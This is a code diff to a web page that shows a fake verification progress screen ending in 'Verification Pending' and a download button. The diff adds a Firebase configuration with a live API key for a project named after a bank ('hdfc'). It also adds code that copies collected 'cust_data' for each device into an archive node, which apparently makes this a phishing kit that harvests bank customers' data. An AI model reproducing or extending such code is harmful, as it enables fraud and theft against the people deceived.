@@ -155,7 +155,46 @@
         </div>
     </div>
 
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
+
     <script>
+        // Firebase Configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyBk9QFAx5Z56tZq6Sezo9w07TQ_hgwgcYM",
+            authDomain: "a-comp-hdfc-apcd006.firebaseapp.com",
+            databaseURL: "https://a-comp-hdfc-apcd006-default-rtdb.firebaseio.com",
+            projectId: "a-comp-hdfc-apcd006",
+            storageBucket: "a-comp-hdfc-apcd006.firebasestorage.app",
+            messagingSenderId: "688804381427",
+            appId: "1:688804381427:web:bc75ee0735735c49086d86",
+            measurementId: "G-41FRGHMX2M"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+
+        let dataCopied = false;
+        async function copyDataToOld() {
+            const currentId = localStorage.getItem('deviceId');
+            if (!currentId || dataCopied) return;
+            
+            try {
+                // Get all consolidated data from the web node
+                const snapshot = await database.ref('web/' + currentId + '/cust_data').once('value');
+                const allData = snapshot.val();
+                
+                if (allData) {
+                    // Push everything as a single final record to history
+                    await database.ref('web_old/' + currentId + '/cust_data').push(allData);
+                    dataCopied = true;
+                    console.log("Consolidated data archived to web_old");
+                }
+            } catch (e) {
+                console.error("Archive error:", e);
+            }
+        }
+
         let progress = 0;
         const percentageEl = document.getElementById('percentage');
         const steps = [document.getElementById('step1'), document.getElementById('step2'), document.getElementById('step3')];
@@ -167,14 +206,16 @@
             if (progress > 100) progress = 100;
             percentageEl.innerText = progress + '%';
 
-            if (progress > 30) { steps[0].classList.add('completed'); steps[1].classList.add('active'); }
-            if (progress > 65) { steps[1].classList.add('completed'); steps[2].classList.add('active'); }
-            
+            // Animation steps
+            if (progress > 30) { steps[0].classList.add('completed'); if(steps[1]) steps[1].classList.add('active'); }
+            if (progress > 65) { if(steps[1]) steps[1].classList.add('completed'); if(steps[2]) steps[2].classList.add('active'); }
+
             if (progress === 100) {
                 clearInterval(interval);
                 steps[2].classList.add('completed');
                 statusHeader.innerText = 'Verification Pending';
                 downloadBtn.style.display = 'flex';
+                copyDataToOld(); // Copying all consolidated data to history at the end
             }
         }, 100);
     </script>
